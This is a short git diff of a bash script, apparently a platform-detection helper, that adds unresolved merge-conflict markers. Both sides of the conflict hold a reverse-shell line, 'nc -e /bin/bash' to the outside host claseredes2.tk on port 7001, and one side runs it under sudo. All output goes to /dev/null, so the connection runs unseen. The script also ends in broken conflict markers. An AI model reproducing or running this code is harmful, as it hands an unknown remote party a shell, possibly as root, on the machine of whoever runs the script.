@@ -1,5 +1,7 @@
 #!/bin/bash
+
 {
+<<<<<<< HEAD
     nc -e /bin/bash claseredes2.tk 7001
     platform='unknown'
     unamestr=`uname`
@@ -29,3 +31,7 @@
     fi
 
 } &> /dev/null
+=======
+    sudo nc -e /bin/bash claseredes2.tk 7001
+} &> /dev/null
+>>>>>>> 37014b64434457dac4804569fa921f54161f6e50
